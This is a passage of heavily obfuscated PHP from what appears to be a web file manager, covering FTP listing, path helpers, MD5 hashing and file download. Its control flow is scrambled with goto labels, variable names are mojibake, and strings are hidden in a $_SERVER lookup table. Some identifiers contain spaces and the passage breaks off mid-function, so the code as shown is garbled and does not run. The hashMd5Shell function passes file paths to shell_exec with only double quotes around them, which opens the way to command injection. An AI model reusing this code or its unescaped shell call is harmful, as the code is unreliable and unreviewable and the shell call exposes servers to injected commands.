$DÅŸœŸÊÈÈ[91], $a¤¥®¢ÖÁÒ . $DÅŸœŸÊÈÈ[1169])); $A›˜ğ‰îÂÍ = array(); foreach ($cë×­®’Ã as $EÕ½¼ÂÍÓî) { if (!strstr($EÕ½¼ÂÍÓî, $DÅŸœŸÊÈÈ[8])) { $EÕ½¼ÂÍÓî = $a¤¥®¢ÖÁÒ . ltrim($EÕ½¼ÂÍÓî, $DÅŸœŸÊÈÈ[8]); } $A›˜ğ‰îÂÍ[] = $this->iconvApp($EÕ½¼ÂÍÓî); } goto CÏ¿ìïíóè; CÏ¿ìïíóè: return $A›˜ğ‰îÂÍ; goto dÂ·Ò÷¸; A•‰£Óõ¹Œ: $a¤¥®¢ÖÁÒ = rtrim($a¤¥®¢ÖÁÒ, $DÅŸœŸÊÈÈ[8]) . $DÅŸœŸÊÈÈ[8]; $cë×­®’Ã = @ftp_nlist($this->connect, $a¤¥®¢ÖÁÒ); if ($cë×­®’Ã === !1) { $cë×­®’Ã = @ftp_rawlist($this->connect, $a¤¥®¢ÖÁÒ); foreach ($cë×­®’Ã as $a÷¥Õ˜–« => $Föœ¾šé¸) { $cë×­®’Ã[$a÷¥Õ˜–«] = end(explode($DÅŸœŸÊÈÈ[1168], $Föœ¾šé¸)); } } goto A¯êâ§»²Û; cÄÄÒ®îœ¬: $DÅŸœŸÊÈÈ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->isFolder($a¤¥®¢ÖÁÒ)) { return !1; } @ftp_chdir($this->connect, $DÅŸœŸÊÈÈ[8]); goto A•‰£Óõ¹Œ; dÂ·Ò÷¸: } private function recursionFtpFiles($eâà‰’¶, &$B¹¡¬—©¯Ì) { $e‹£’¸íè =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->_isconn()) { return !1; } if (!($CÉÅº÷“¬… = $this->ftpList($eâà‰’¶))) { return !1; } foreach ($CÉÅº÷“¬… as $eâà‰’¶) { if ($this->isFolder($eâà‰’¶)) { $this->recursionFtpFiles($eâà‰’¶, $B¹¡¬—©¯Ì); $B¹¡¬—©¯Ì[$e‹£’¸íè[74]][] = $eâà‰’¶; } else { $B¹¡¬—©¯Ì[$e‹£’¸íè[73]][] = $eâà‰’¶; } } } private function objectMeta($aŒï¥îçˆ) { goto dË–¹¯Âñä; DöŠ®ê°É“: if ($eÏĞº¼‰Ê™ !== null && $eÏĞº¼‰Ê™ !== !1) { return $eÏĞº¼‰Ê™; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $CÇª¦­÷•·[8]); goto A¦ÛºšŒ–Ü; A¦ÛºšŒ–Ü: $DÉ¯›ö¼ĞÔ = @ftp_size($this->connect, $this->iconvSystem($aŒï¥îçˆ)); if ($DÉ¯›ö¼ĞÔ != -1) { $eÏĞº¼‰Ê™ = array($CÇª¦­÷•·[77] => $DÉ¯›ö¼ĞÔ, $CÇª¦­÷•·[29] => $CÇª¦­÷•·[167]); } else { $cË×ç™ˆÜ„ = @ftp_chdir($this->connect, $this->iconvSystem($aŒï¥îçˆ)); $eÏĞº¼‰Ê™ = $cË×ç™ˆÜ„ ? array($CÇª¦­÷•·[77] => 0, $CÇª¦­÷•·[29] => $CÇª¦­÷•·[76]) : !1; } Cache::set($a»Òáí†, $eÏĞº¼‰Ê™, 0); goto aàŸñĞç; aàŸñĞç: return $eÏĞº¼‰Ê™; goto CğìÛÓÌˆö; dË–¹¯Âñä: $CÇª¦­÷•· =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a»Òáí† = $CÇª¦­÷•·[1170] . md5($aŒï¥îçˆ); $eÏĞº¼‰Ê™ = Cache::get($a»Òáí†); goto DöŠ®ê°É“; CğìÛÓÌˆö: } } goto e®¼İ¾é; FØ¸•ÉˆØ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $bÏ¬É Ìà =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->objectDriver = array($bÏ¬É Ìà[57], $bÏ¬É Ìà[58], $bÏ¬É Ìà[59], $bÏ¬É Ìà[60], $bÏ¬É Ìà[61], $bÏ¬É Ìà[62], $bÏ¬É Ìà[63], $bÏ¬É Ìà[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($FÖŒìÑÑÓ¬) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($FÖŒìÑÑÓ¬, $_SERVER[´Ù×Íå‘ÄõÛ][8]); } return $FÖŒìÑÑÓ¬; } public function getPathName($Cê×Á•‰‰Õ) { return $Cê×Á•‰‰Õ; } public function iconvApp($cšÂ»ñ«Ê¹) { return $cšÂ»ñ«Ê¹; } public function iconvSystem($a½íÃ„) { return $a½íÃ„; } public function iconvTo($CäãÓ‡œç³, $b£Ó…â”ï…, $dˆ‡ÈºÇ‘¶) { goto eË©‘ÑÜãœ; F¿Õƒõ”ÜŠ: $E·¬œùï“[$dˆ‡ÈºÇ‘¶ . $Bù²—ë™é[66] . $b£Ó…â”ï… . $Bù²—ë™é[67] . $CäãÓ‡œç³] = $CäãÓ‡œç³; $E·¬œùï“[$dˆ‡ÈºÇ‘¶ . $Bù²—ë™é[66] . $b£Ó…â”ï… . $Bù²—ë™é[67] . $d½œÁÒï«µ] = $CäãÓ‡œç³; $E·¬œùï“[$b£Ó…â”ï… . $Bù²—ë™é[66] . $dˆ‡ÈºÇ‘¶ . $Bù²—ë™é[67] . $d½œÁÒï«µ] = $d½œÁÒï«µ; goto b³Ö“ùø«ï; b³Ö“ùø«ï: return $d½œÁÒï«µ; goto a—®‹¤øƒ; eË©‘ÑÜãœ: $Bù²—ë™é =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$CäãÓ‡œç³ || !function_exists($Bù²—ë™é[65])) { return $CäãÓ‡œç³; } static $E·¬œùï“ = array(); goto D‡„ªÀ¾ˆ; EŠ¸”îœœÌ: $d½œÁÒï«µ = $d½œÁÒï«µ ? $d½œÁÒï«µ : $CäãÓ‡œç³; if (strstr($d½œÁÒï«µ, $Bù²—ë™é[69])) { $d½œÁÒï«µ = str_replace($Bù²—ë™é[69], $Bù²—ë™é[70], $d½œÁÒï«µ); } $E·¬œùï“[$b£Ó…â”ï… . $Bù²—ë™é[66] . $dˆ‡ÈºÇ‘¶ . $Bù²—ë™é[67] . $CäãÓ‡œç³] = $d½œÁÒï«µ; goto F¿Õƒõ”ÜŠ; D‡„ªÀ¾ˆ: $B•†…‹È£¿ = $b£Ó…â”ï… . $Bù²—ë™é[66] . $dˆ‡ÈºÇ‘¶ . $Bù²—ë™é[67] . $CäãÓ‡œç³; if (isset($E·¬œùï“[$B•†…‹È£¿])) { return $E·¬œùï“[$B•†…‹È£¿]; } if (function_exists($Bù²—ë™é[68])) { $d½œÁÒï«µ = @mb_convert_encoding($CäãÓ‡œç³, $dˆ‡ÈºÇ‘¶, $b£Ó…â”ï…); } else { $d½œÁÒï«µ = @iconv($b£Ó…â”ï…, $dˆ‡ÈºÇ‘¶, $CäãÓ‡œç³); } goto EŠ¸”îœœÌ; a—®‹¤øƒ: } public function getPathInner($dïÛ¾¼‰â˜) { $Bå’ğ×Òî = IO::init($dïÛ¾¼‰â˜); return $Bå’ğ×Òî->path; } public function getPathOuter($dãËá¡†‘ô) { $f÷¿Û¦á…Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a›Ä†ÙñÃ = strlen(trim($this->pathBase, $f÷¿Û¦á…Ü[8])); $dãËá¡†‘ô = substr(trim($dãËá¡†‘ô, $f÷¿Û¦á…Ü[8]), $a›Ä†ÙñÃ); return $this->pathDriver . $f÷¿Û¦á…Ü[8] . ltrim($dãËá¡†‘ô, $f÷¿Û¦á…Ü[8]); } public function isParentOf($b¤‹î¥™, $AÁ³…—ÑÀƒ) { $B‡ùµÒ¾ÌÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b¤‹î¥™ = rtrim(strtolower($b¤‹î¥™), $B‡ùµÒ¾ÌÓ[8]) . $B‡ùµÒ¾ÌÓ[8]; $AÁ³…—ÑÀƒ = rtrim(strtolower($AÁ³…—ÑÀƒ), $B‡ùµÒ¾ÌÓ[8]) . $B‡ùµÒ¾ÌÓ[8]; $aÚÙ¯øƒ· = strpos($AÁ³…—ÑÀƒ, $b¤‹î¥™) === 0; return $aÚÙ¯øƒ·; } public function getType() { $eÁâÌÉë…ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AêË‚÷À»™ = str_replace($eÁâÌÉë…ä[71], $eÁâÌÉë…ä[33], get_class($this)); return strtolower($AêË‚÷À»™); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($FÓÉËÈÆ, $cÖÔ’¿‘ãá) { $c‘Š’™ª =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a·óºèñ = rtrim($FÓÉËÈÆ, $c‘Š’™ª[8]) . $c‘Š’™ª[8] . $cÖÔ’¿‘ãá; $FõæÉ¢õ¬ = $this->exist($a·óºèñ); return $FõæÉ¢õ¬ ? $a·óºèñ : !1; } public function setModifyTime($fğİçæ™·, $dò˜Ò‹”ê = '') { } public function renameObject($fÍ†¼ŒÔ‹», $b”ëÑÚ„´) { goto DáÁÓªà‹Ÿ; cøØïÌİ­ˆ: return $F†ƒ§½À¹ø ? $b”ëÑÚ„´ : !1; goto bÀ•Œºç; DáÁÓªà‹Ÿ: $b„å£è°Û =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D•”½«ª‡± = $b”ëÑÚ„´; Hook::trigger($b„å£è°Û[72], $this, $fÍ†¼ŒÔ‹», $this, $this->pathFather($fÍ†¼ŒÔ‹») . $b”ëÑÚ„´); goto açÖÔˆâ³; açÖÔˆâ³: $fÍ†¼ŒÔ‹» = $this->getPathOuter($fÍ†¼ŒÔ‹»); $b”ëÑÚ„´ = $this->pathFather($fÍ†¼ŒÔ‹») . $b”ëÑÚ„´; if (IO::isFile($fÍ†¼ŒÔ‹»)) { $F†ƒ§½À¹ø = IO::copy($fÍ†¼ŒÔ‹», $this->pathFather($fÍ†¼ŒÔ‹»), REPEAT_RENAME_FOLDER, $D•”½«ª‡±); if ($F†ƒ§½À¹ø) { IO::remove($fÍ†¼ŒÔ‹»); } } else { $F†ƒ§½À¹ø = IO::mkdir($b”ëÑÚ„´); if (!$F†ƒ§½À¹ø) { return !1; } $C‹…–¨±×Ñ = IO::listPath($fÍ†¼ŒÔ‹», !0); $C«Óî‰¯À¯ = array_merge($C‹…–¨±×Ñ[$b„å£è°Û[73]], $C‹…–¨±×Ñ[$b„å£è°Û[74]]); foreach ($C«Óî‰¯À¯ as $d‚¥ßïù¢Â) { IO::move($d‚¥ßïù¢Â[$b„å£è°Û[75]], $b”ëÑÚ„´, REPEAT_RENAME_FOLDER); } IO::remove($fÍ†¼ŒÔ‹»); } goto cøØïÌİ­ˆ; bÀ•Œºç: } public function tempFile($e£ò£óÃÍô = '', $aìÕ»›«ˆš = '') { goto EÖ–êÕ¸‘Ù; EÖ–êÕ¸‘Ù: if (!$e£ò£óÃÍô) { $e£ò£óÃÍô = rand_string(15); } $d¦«—äÈ¸“ = TEMP_FILES . rand_string(15) . $_SERVER[´Ù×Íå‘ÄõÛ][8]; @mkdir($d¦«—äÈ¸“, 511, !0); goto DË´³Ñ¶Ã’; DË´³Ñ¶Ã’: $bˆºÕïù = $d¦«—äÈ¸“ . $e£ò£óÃÍô; @touch($bˆºÕïù); if ($aìÕ»›«ˆš) { file_put_contents($bˆºÕïù, $aìÕ»›«ˆš); } goto EÓ‚ÒÔ˜¢š; EÓ‚ÒÔ˜¢š: return $bˆºÕïù; goto DÙÓƒ¼ñÇ; DÙÓƒ¼ñÇ: } public function tempFileRemve($E‰ô›Ü¥à¢) { @unlink($E‰ô›Ü¥à¢); @rmdir($this->pathFather($E‰ô›Ü¥à¢)); } public function mkfile($B«Ó¯À³§Ã, $cÃŸƒöíÄ = '', $d˜ïÈ“³´÷ = REPEAT_RENAME) { } public function mkdir($E Ñï»×ÀÇ, $bÙÕñŞ—Œ‡ = REPEAT_SKIP) { } public function delFile($A¾Ö·÷·Ø) { } public function delFolder($eê‡Ó½‰òŞ) { } public function copyFile($CË³¡Ì¦¯—, $CàÄ©ˆ¨Ä¤) { } public function moveFile($dº“ÀŸ×ùï, $Cç•‚Ïæ§) { } public function remove($DâÖ­ƒ‚˜) { if ($this->isFile($DâÖ­ƒ‚˜)) { return $this->delFile($DâÖ­ƒ‚˜); } return $this->delFolder($DâÖ­ƒ‚˜); } public function rename($F³Û¤ÖÍÀ, $E¯‰†›ÌÙ) { } public function exist($f‹Âë” –ˆ) { } public function findByHash($fÂ‚ß§†ˆ = '', $fôİˆ¬Œƒ³ = '') { return !1; } public function isFile($DÏ¬Ê»£ÔÃ) { } public function isFolder($B¹´•ÔŒ¬©) { } public function size($d‘ŞÎŞÛö) { } public function info($B¾ÈˆÕõå) { } public function infoSimple($A‰ˆÒª“) { return $this->info($A‰ˆÒª“); } public function infoAuth($F÷ˆ½¿ÆéŠ) { return $this->info($F÷ˆ½¿ÆéŠ); } public function infoFull($dâ¹¥ ‹¤Ì) { return $this->info($dâ¹¥ ‹¤Ì); } public function infoWithChildren($fİç’òÄõÑ) { $DñªÃ°éòİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $Fœµ¶Šäñã = array(); if (isset($Fœµ¶Šäñã[$fİç’òÄõÑ])) { return $Fœµ¶Šäñã[$fİç’òÄõÑ]; } $dÉ¬‚ˆ‹Æ = $this->info($fİç’òÄõÑ); if ($dÉ¬‚ˆ‹Æ && $dÉ¬‚ˆ‹Æ[$DñªÃ°éòİ[29]] == $DñªÃ°éòİ[76]) { $Cç–•ï§½² = array($DñªÃ°éòİ[77] => 0, $DñªÃ°éòİ[78] => 0, $DñªÃ°éòİ[79] => 0); $this->infoChildren($fİç’òÄõÑ, $Cç–•ï§½²); $dÉ¬‚ˆ‹Æ[$DñªÃ°éòİ[77]] = $Cç–•ï§½²[$DñªÃ°éòİ[77]]; $dÉ¬‚ˆ‹Æ[$DñªÃ°éòİ[80]] = array($DñªÃ°éòİ[81] => $Cç–•ï§½²[$DñªÃ°éòİ[78]], $DñªÃ°éòİ[82] => $Cç–•ï§½²[$DñªÃ°éòİ[79]]); $Fœµ¶Šäñã[$fİç’òÄõÑ] = $dÉ¬‚ˆ‹Æ; } return $dÉ¬‚ˆ‹Æ; } public function listPath($CÃè¢…Ğ§, $A‚¦º‰ÁÆ¶ = false) { } public function has($e°Î”“¦ô, $CÒ’Õóá¥µ = false, $bšµ‚˜‰°’ = false) { } public function canRead($D¸õô…Áâ) { } public function canWrite($CçÍÔ´÷©) { } public function getContent($cĞ‚†öİ“) { } public function setContent($DÍ©ëÄÑ©—, $F…Š”ÙÜ”„ = '') { } protected function infoChildren($fêŠ²ğ„ê, &$EƒßŒÕªÔ) { $cö‚×¡¤º =& $_SERVER[´Ù×Íå‘ÄõÛ]; check_abort(); $Bò²®øáÚ¿ = $this->listPath($fêŠ²ğ„ê, !0); $Bò²®øáÚ¿ = array_merge($Bò²®øáÚ¿[$cö‚×¡¤º[74]], $Bò²®øáÚ¿[$cö‚×¡¤º[73]]); foreach ($Bò²®øáÚ¿ as $A·ØÉÒïã) { if ($A·ØÉÒïã[$cö‚×¡¤º[29]] == $cö‚×¡¤º[76]) { $EƒßŒÕªÔ[$cö‚×¡¤º[79]]++; $bœÑÉ¼·ƒ… = $this->getPathInner($A·ØÉÒïã[$cö‚×¡¤º[75]]); $this->infoChildren($bœÑÉ¼·ƒ…, $EƒßŒÕªÔ); } else { $EƒßŒÕªÔ[$cö‚×¡¤º[78]]++; $EƒßŒÕªÔ[$cö‚×¡¤º[77]] += $A·ØÉÒïã[$cö‚×¡¤º[77]]; } } } public function fileSubstr($fŞ†¨†¨İƒ, $Eˆó›ÆŒŠ, $AÆµÓƒå´„) { } public function listAll($DÁØ½è³‡Ÿ) { } public function upload($CáËá˜­§š, $DÅÔÉÙïÅ, $BŠ±¿ë÷Ê¾ = false, $dğ£…ì’‘® = REPEAT_REPLACE) { } public function uploadFileByID($cÎŞçœÖ¡«, $fÎÕÍ¨ÔÁ¦, $A‹ë˜ˆÃ) { } public function uploadFileByPath($D‡Û”›Ç÷, $aÓÅ¦ĞÏÊ, $Dƒ½åÆâòª = array()) { } public function isUploadServer() { $Bº°†Îèµ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Bº°†Îèµ[83]) { return !0; } return $GLOBALS[$Bº°†Îèµ[6]][$Bº°†Îèµ[84]][$Bº°†Îèµ[85]]; } public function isFileOutServer() { $d¸óäÍ¥ƒÚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $d¸óäÍ¥ƒÚ[83]) { return !0; } return $GLOBALS[$d¸óäÍ¥ƒÚ[6]][$d¸óäÍ¥ƒÚ[84]][$d¸óäÍ¥ƒÚ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($AÆà‡Îñ) { $F¨“ŞÏ»çî =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->isCdnHost()) { return $AÆà‡Îñ; } return str_replace(trim(get_url_root($AÆà‡Îñ), $F¨“ŞÏ»çî[8]), trim($this->cdnHost, $F¨“ŞÏ»çî[8]), $AÆà‡Îñ); } public function uploadLink($DÑëìŠˆõá, $b’ßçÃâ¥ó = 0) { goto C ÄóàÒÀ; AÙõ¨ß‰¬ø: $FŠè‰Ã¦‡ = $b’ßçÃâ¥ó <= $bê´ôË©£Ã ? $b‡’š±è“†[87] : $b‡’š±è“†[88]; $E‘¯–“É¤Á = (!$b’ßçÃâ¥ó ? 1 : ceil($b’ßçÃâ¥ó / pow(1024, 3))) * 3600 * 4; $B§”–ÁÆŠ¡ = $this->{$FŠè‰Ã¦‡}($DÑëìŠˆõá, $E‘¯–“É¤Á); goto fÑ÷ğİ×“; fÑ÷ğİ×“: if ($B§”–ÁÆŠ¡) { $B§”–ÁÆŠ¡[$b‡’š±è“†[89]] = $DÑëìŠˆõá; $B§”–ÁÆŠ¡[$b‡’š±è“†[90]] = $a“ñ™Ÿµïó; } return $B§”–ÁÆŠ¡; goto dÏë÷¬ª; C ÄóàÒÀ: $b‡’š±è“† =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->isUploadServer()) { return; } $a“ñ™Ÿµïó = $this->getType(); goto b¦”ê²…ğâ; b¦”ê²…ğâ: if (!in_array($a“ñ™Ÿµïó, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $bê´ôË©£Ã = 1024 * 1024 * 10; goto AÙõ¨ß‰¬ø; dÏë÷¬ª: } public function uploadFormData($aØ’’‡é½Ì, $c‘¿æŸ…ÎÊ = 3600) { } public function multiUploadFormData($dÌ’“İÍÙª, $e×ï¨ê—Ø = 3600) { } public function download($fĞ¤ä¢ƒõĞ, $EÁ‹õóŠ‘) { } public function ext($A³¤”†‘) { $A’ÊÛÖæ…´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (strpos($A³¤”†‘, $A’ÊÛÖæ…´[8]) === -1) { $Bª¿îŞ¢÷ = $A³¤”†‘; } else { $Bª¿îŞ¢÷ = $this->pathThis($A³¤”†‘); } $aá³„È²ˆã = $A’ÊÛÖæ…´[33]; if (strstr($Bª¿îŞ¢÷, $A’ÊÛÖæ…´[91])) { $aá³„È²ˆã = substr($Bª¿îŞ¢÷, strrpos($Bª¿îŞ¢÷, $A’ÊÛÖæ…´[91]) + 1); $aá³„È²ˆã = strtolower($aá³„È²ˆã); } if (strlen($aá³„È²ˆã) > 3 && preg_match($A’ÊÛÖæ…´[92], $aá³„È²ˆã, $EÁĞÊê¦Ö)) { $aá³„È²ˆã = $A’ÊÛÖæ…´[33]; } return $aá³„È²ˆã; } public function pathThis($f—¢ôÚŒïè) { $b‚ÁÎÇÌ¾¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f—¢ôÚŒïè = str_replace($b‚ÁÎÇÌ¾¦[93], $b‚ÁÎÇÌ¾¦[8], rtrim($f—¢ôÚŒïè, $b‚ÁÎÇÌ¾¦[8])); $A„¬ÜæÂÀÕ = strrpos($f—¢ôÚŒïè, $b‚ÁÎÇÌ¾¦[8]); if ($A„¬ÜæÂÀÕ === !1) { return $f—¢ôÚŒïè; } return substr($f—¢ôÚŒïè, $A„¬ÜæÂÀÕ + 1); } public function pathFather($cŞ–¤Ò†â¿) { $e³÷Êïè™Ú =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cŞ–¤Ò†â¿ = str_replace($e³÷Êïè™Ú[93], $e³÷Êïè™Ú[8], rtrim($cŞ–¤Ò†â¿, $e³÷Êïè™Ú[8])); $fÅï„—“ë = strrpos($cŞ–¤Ò†â¿, $e³÷Êïè™Ú[8]); if ($fÅï„—“ë === !1) { return $e³÷Êïè™Ú[33]; } return substr($cŞ–¤Ò†â¿, 0, $fÅï„—“ë + 1); } public function hashSimple($B¸ÌÃ±ãºµ) { goto CôŠ‚¬‘; CôŠ‚¬‘: $cí¸İÚÙ·Õ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$B¸ÌÃ±ãºµ) { return md5($cí¸İÚÙ·Õ[33]); } $b›ÒÏœÒ¤µ = $this->size($B¸ÌÃ±ãºµ); goto BõÎ£Èˆ¿; BõÎ£Èˆ¿: $e°åó²±ßà = 200; $BÙ¼¥”ƒ‹É = 50; if ($b›ÒÏœÒ¤µ <= $e°åó²±ßà * $BÙ¼¥”ƒ‹É) { return $this->hashMd5($B¸ÌÃ±ãºµ) . $b›ÒÏœÒ¤µ; } goto bÃ…ªİìë½; F®ƒ²Ä™Ì: $d¤Øö¥ØÇ† .= $this->fileSubstr($B¸ÌÃ±ãºµ, $b›ÒÏœÒ¤µ - $e°åó²±ßà, $e°åó²±ßà); return md5($d¤Øö¥ØÇ†) . $b›ÒÏœÒ¤µ; goto c´ĞÅ­ˆ´Ä; bÃ…ªİìë½: $c”Éé¨Ò = intval($b›ÒÏœÒ¤µ / $BÙ¼¥”ƒ‹É); $d¤Øö¥ØÇ† = $cí¸İÚÙ·Õ[33]; for ($c‘«Ç¥âÅ” = 0; $c‘«Ç¥âÅ” < $BÙ¼¥”ƒ‹É; $c‘«Ç¥âÅ”++) { $d¤Øö¥ØÇ† .= $this->fileSubstr($B¸ÌÃ±ãºµ, $c”Éé¨Ò * $c‘«Ç¥âÅ”, $e°åó²±ßà); } goto F®ƒ²Ä™Ì; c´ĞÅ­ˆ´Ä: } public static $md5Cache = array(); public function hashMd5($FŠ¥’·˜òÌ) { $FŠ¥’·˜òÌ = $this->iconvSystem($FŠ¥’·˜òÌ); if (isset(self::$md5Cache[$FŠ¥’·˜òÌ])) { return self::$md5Cache[$FŠ¥’·˜òÌ]; } self::$md5Cache[$FŠ¥’·˜òÌ] = $this->hashMd5Shell($FŠ¥’·˜òÌ); if (!self::$md5Cache[$FŠ¥’·˜òÌ]) { self::$md5Cache[$FŠ¥’·˜òÌ] = @md5_file($FŠ¥’·˜òÌ); } return self::$md5Cache[$FŠ¥’·˜òÌ]; } private function hashMd5Shell($f®‰®ñîÄİ) { goto aÍÑ‹¢°Äò; A¡›õ”»‰–: $Bá‚ª¸Ø£ã = shell_exec($bôÂ”‰„“˜ . "\40\42{$f®‰®ñîÄİ}\x22"); $Bá‚ª¸Ø£ã = str_replace($cÄƒ…¤›‰©[100], $cÄƒ…¤›‰©[33], $Bá‚ª¸Ø£ã); return substr($Bá‚ª¸Ø£ã, 0, 32); goto D•³øÕˆï; aÍÑ‹¢°Äò: $cÄƒ…¤›‰© =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!function_exists($cÄƒ…¤›‰©[94])) { return !1; } $B•ßò—ßÍÔ = array($cÄƒ…¤›‰©[95], $cÄƒ…¤›‰©[96]); goto D‚Š–×¼İ; D‚Š–×¼İ: $bôÂ”‰„“˜ = Cache::get($cÄƒ…¤›‰©[97]); if (!$bôÂ”‰„“˜) { $Fë²Œèóâç = BASIC_PATH . $cÄƒ…¤›‰©[98]; $e—èî„¨ÄŒ = md5_file($Fë²Œèóâç); $bôÂ”‰„“˜ = $cÄƒ…¤›‰©[99]; foreach ($B•ßò—ßÍÔ as $a¶Ïé†ÄøÚ) { $Bá‚ª¸Ø£ã = shell_exec($a¶Ïé†ÄøÚ . "\40\42{$Fë²Œèóâç}\x22"); if ($Bá‚ª¸Ø£ã && substr(trim($Bá‚ª¸Ø£ã), 0, 32) == $e—èî„¨ÄŒ) { $bôÂ”‰„“˜ = $a¶Ïé†ÄøÚ; break; } } Cache::set($cÄƒ…¤›‰©[97], $bôÂ”‰„“˜, 3600); } if ($bôÂ”‰„“˜ == $cÄƒ…¤›‰©[99]) { return !1; } goto A¡›õ”»‰–; D•³øÕˆï: } public function link($CáÃ­æŞ™) { return $CáÃ­æŞ™; } public function fileOut($dÂ–Ó‰Ÿùº, $C÷Ì÷â¿Ïã = false, $AõæÒ¨ß„¦ = false, $bÅ¥İ™ÅŒé = '') { goto Bå„«¸®ÔÜ; A…ä¸§Ô·: $B£ŒÓ¹»ÒÌ = !0; if ($_SERVER[$A½­éİ¬’¹[151]] == $A½­éİ¬’¹[152] && $BÂ½ÛÍÑ† > 1204 * 1024 * 1024 * 2) { $B£ŒÓ¹»ÒÌ = !1; } if ($B£ŒÓ¹»ÒÌ) { header($A½­éİ¬’¹[153] . ($Fá•³ßÜœ - $EÌöùëé‚é + 1)); } goto A¬–³¢®Í; D‡¡³Ô®¼”: $EÌöùëé‚é = 0; $Fá•³ßÜœ = $BÂ½ÛÍÑ† - 1; $càğ”ùš—— = $this->ext($eÚ•„è¾ƒõ); goto CÊŠëÌÌÀ˜; DÂò˜«¼‡Ÿ: $bÛšÛì°Û¡ = strtolower($_SERVER[$A½­éİ¬’¹[139]]); if ($C£ğÊ¢¾¥ && $bÛšÛì°Û¡ && $EàÎ¥Äğ†â) { if (strstr($bÛšÛì°Û¡, $A½­éİ¬’¹[140])) { header($A½­éİ¬’¹[141] . $dÂ–Ó‰Ÿùº); } else { if (strstr($bÛšÛì°Û¡, $A½­éİ¬’¹[142])) { header($A½­éİ¬’¹[143] . $dÂ–Ó‰Ÿùº); } else { if (strstr($bÛšÛì°Û¡, $A½­éİ¬’¹[144])) { header($A½­éİ¬’¹[145] . $dÂ–Ó‰Ÿùº); } } } if ($dá¨ßÒÒ¯) { header($A½­éİ¬’¹[146] . $dá¨ßÒÒ¯); } return; } if (isset($_SERVER[$A½­éİ¬’¹[147]])) { if (preg_match($A½­éİ¬’¹[148], $_SERVER[$A½­éİ¬’¹[147]], $cÏ—°™ò³)) { $EÌöùëé‚é = intval($cÏ—°™ò³[1]); if (!empty($cÏ—°™ò³[2])) { $Fá•³ßÜœ = intval($cÏ—°™ò³[2]); } } header($A½­éİ¬’¹[149]); header("\x43\x6f\156\164\145\x6e\164\55\122\141\x6e\147\145\x3a\x20\142\x79\x74\x65\163\40{$EÌöùëé‚é}\55{$Fá•³ßÜœ}\x2f" . $BÂ½ÛÍÑ†); } else { header($A½­éİ¬’¹[150]); } goto A…ä¸§Ô·; A‹ÛâÖ ŒÛ: $eÆùİö–‡‚ = rawurlencode($eÚ•„è¾ƒõ); $eÆùİö–‡‚ = $A½­éİ¬’¹[113] . $eÆùİö–‡‚ . $A½­éİ¬’¹[117] . $eÆùİö–‡‚; if ($C÷Ì÷â¿Ïã) { header($A½­éİ¬’¹[118]); header($A½­éİ¬’¹[119] . $eÆùİö–‡‚); } else { header($A½­éİ¬’¹[120] . $eÆùİö–‡‚); } goto a“’™Ê…âœ; f¸áóøÆïÕ: if ($dá¨ßÒÒ¯) { $AÕ™Ÿ¹´²ã = intval(1000 * 1000 * ($C«Ã˜ˆ’ÃË / $dá¨ßÒÒ¯)); } while ($EÌöùëé‚é <= $Fá•³ßÜœ) { $Böï‡‡³Íë = timeFloat(); check_abort(); $CŸñÂöÂ÷ = $Fá•³ßÜœ - $EÌöùëé‚é + 1; if ($CŸñÂöÂ÷ <= $C«Ã˜ˆ’ÃË) { $C«Ã˜ˆ’ÃË = $CŸñÂöÂ÷; } echo $this->fileSubstr($dÂ–Ó‰Ÿùº, $EÌöùëé‚é, $C«Ã˜ˆ’ÃË); $EÌöùëé‚é += $C«Ã˜ˆ’ÃË; if ($C«Ã˜ˆ’ÃË == $CŸñÂöÂ÷) { $EÌöùëé‚é = $Fá•³ßÜœ + 1; } if ($AÕ™Ÿ¹´²ã) { $AÍ¢çäÁö¡ = intval(1000 * 1000 * (timeFloat() - $Böï‡‡³Íë)); $b±åƒ¸ãê = $AÕ™Ÿ¹´²ã - $AÍ¢çäÁö¡; if ($b±åƒ¸ãê > 5) { usleep($b±åƒ¸ãê); } } } goto AŒä–Œà³; aº‘‘Ò‹Ê: @ob_end_clean(); set_timeout(); $F‘ãÖÄ¢ö– = $this->infoFull($dÂ–Ó‰Ÿùº); goto a‚çÉëÃ ; BÃÈ‹Éöß„: header($A½­éİ¬’¹[125]); header($A½­éİ¬’¹[126]); header($A½­éİ¬’¹[127]); goto D›ŒÔ¶­’·; Bå„«¸®ÔÜ: $A½­éİ¬’¹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->cacheMethod(null, null); if (!$dÂ–Ó‰Ÿùº || !$this->exist($dÂ–Ó‰Ÿùº)) { show_json(LNG($A½­éİ¬’¹[101]), !1, $AõæÒ¨ß„¦); } goto cåéµµ¿¥—; cåñ„‹ºé: header($A½­éİ¬’¹[132] . $f¼Æ÷“š¶ . $A½­éİ¬’¹[124]); header($A½­éİ¬’¹[133] . $eÚ•„è¾ƒõ); 